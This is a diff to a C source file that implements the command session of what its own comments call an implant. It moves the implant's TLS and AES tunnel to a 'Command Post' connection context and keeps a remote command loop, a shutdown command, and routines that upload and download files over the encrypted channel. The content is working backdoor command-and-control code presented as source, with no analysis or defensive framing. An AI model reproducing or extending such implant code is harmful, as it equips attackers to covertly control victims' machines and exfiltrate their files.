@@ -1,8 +1,5 @@
 #include "client_session.h"
 
-#include "compat.h"
-#include "polarssl/net.h"
-
 #if defined LINUX || defined SOLARIS
 #include <time.h>
 #include <sys/types.h>
@@ -30,8 +27,8 @@ static int hstat( int fd );
 const unsigned long CMD_TIMEOUT = 5*60*1000; // 5 minutes
 const unsigned long PKT_TIMEOUT = 30*1000; // 30 sec.
 
-static ssl_context	trig_ssl;
-static ssl_session	trig_ssn;
+crypt_context *cp;		// Command Post network connection context
+
 #define _fstat fstat
 
 //******************************************************************
@@ -108,7 +105,7 @@ int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long time
 	while(receivedTotal < size) {
 		if (select(sock+1,&readFDs,0,0,&timeout)) {
 //			received = recv(sock,(char*)buf + receivedTotal,size - receivedTotal,0);
-			if ((received = crypt_read(&trig_ssl, buf + receivedTotal, size - receivedTotal)) < 0) {
+			if ((received = crypt_read(cp, buf + receivedTotal, size - receivedTotal)) < 0) {
 				DLX(4, printf("crypt_read() failed, returned: -0x%04d", received));
 				return SOCKET_ERROR;
 			}
@@ -152,7 +149,7 @@ int UploadFile(char* path, unsigned long size, int sock)
 	//send reply (guessing it lets client know we are ready to receive data of file?)
 //	if(SOCKET_ERROR == send(sock,(const char*) &ret, sizeof(REPLY),0))
 	// TODO <= 0
-	if (crypt_write(&trig_ssl, (unsigned char*) &ret, sizeof(REPLY)) < 0) {
+	if (crypt_write(cp, (unsigned char*) &ret, sizeof(REPLY)) < 0) {
 		goto Error;
 	}
 	DLX(2, printf("Acknowledged UploadFile with file size of %lu bytes\n", size));
@@ -251,7 +248,7 @@ int DownloadFile(char *path, unsigned long size, int sock)
 
 	// Send reply with the file size so the client knows
 	DLX(4, printf("Sending reply\n"));
-	if (crypt_write(&trig_ssl, (unsigned char*)&ret, sizeof(REPLY)) < 0 )
+	if (crypt_write(cp, (unsigned char*)&ret, sizeof(REPLY)) < 0)
 	{
 		DLX(2, printf("crypt_write() error\n"));
 		goto Error;
@@ -272,7 +269,7 @@ int DownloadFile(char *path, unsigned long size, int sock)
 			int rv;
 			// Write file to the network
 			DLX(8, printf("Writing data of length %u to network\n", bytes_read));
-			if ((rv = crypt_write(&trig_ssl, data, bytes_read)) < 0) {
+			if ((rv = crypt_write(cp, data, bytes_read)) < 0) {
 				if (bytes_written == POLARSSL_ERR_NET_WANT_WRITE)
 					continue;
 				DLX(3, printf("crypt_write() error, returned -0x%04x\n", rv));
@@ -433,25 +430,25 @@ unsigned long StartClientSession( int sock )
 	// we have an established TCP/IP connection
 	// although we consider this the SERVER, for the SSL/TLS transaction, 
 	// the implant acts as a SSL client
-	if ( crypt_setup_client(&trig_ssl, &trig_ssn, &sock ) != SUCCESS )
+	if ((cp = crypt_setup_client(&sock)) == NULL)
 	{
 		DLX(2, printf("ERROR: crypt_setup_client()\n"));
-			crypt_cleanup( &trig_ssl);
+			crypt_cleanup(cp);
 		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
 	}
 
 	// start TLS handshake
 	DL(3);
-	if ( crypt_handshake(&trig_ssl) != SUCCESS )
+	if ( crypt_handshake(cp) != SUCCESS )
 	{
 		DLX(2, printf("ERROR: TLS connection with TLS server failed to initialize.\n"));
-			crypt_cleanup( &trig_ssl);
+			crypt_cleanup(cp);
 		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
 	}
 	DLX(3, printf("TLS handshake complete.\n"));
 
 	// Create AES Tunnel
-	if (aes_init(&trig_ssl) == 0) {
+	if (aes_init(cp) == 0) {
 		DLX(4, printf("aes_init() failed\n"));
 		goto Exit;
 	}
@@ -471,7 +468,7 @@ unsigned long StartClientSession( int sock )
 		// this timeout is reset each time a command is received.
 		alarm( SESSION_TIMEOUT );
 
-		if ( (r = crypt_read( &trig_ssl, (unsigned char *)&cmd, sizeof( COMMAND ))) < 0 )
+		if ( (r = crypt_read(cp, (unsigned char *)&cmd, sizeof(COMMAND))) < 0 )
 		{
 			DLX(4, printf("\tERROR: crypt_read(): ret = %d\n", r));
 			if (r == POLARSSL_ERR_NET_WANT_READ)
@@ -531,7 +528,7 @@ unsigned long StartClientSession( int sock )
 				DLX(2, printf("SHUTDOWN command received.\n"));
 				fQuit = 1;
 				ret.reply = 0;
-				crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(ret) );
+				crypt_write(cp, (unsigned char*)&ret, sizeof(ret));
 				//			send(sock, (const char*)&ret, sizeof(ret),0);
 				closesocket(sock);
 				sock = INVALID_SOCKET;
@@ -557,7 +554,7 @@ unsigned long StartClientSession( int sock )
 
 		// Send reply
 		//		if( SOCKET_ERROR == send(sock, (const char*)&ret, sizeof(ret),0))
-		if (crypt_write(&trig_ssl, (unsigned char*)&ret, sizeof(ret)) < 0)
+		if (crypt_write(cp, (unsigned char*)&ret, sizeof(ret)) < 0)
 		{
 			closesocket(sock);
 			goto Exit;
@@ -569,8 +566,8 @@ unsigned long StartClientSession( int sock )
 		// back and forth.
 Exit:
 	if( commandpath != 0 ) free( commandpath );
-	crypt_cleanup( &trig_ssl);
-	aes_terminate();
+	crypt_cleanup(cp);
+	aes_terminate(cp);
 
 	return retval;
 }
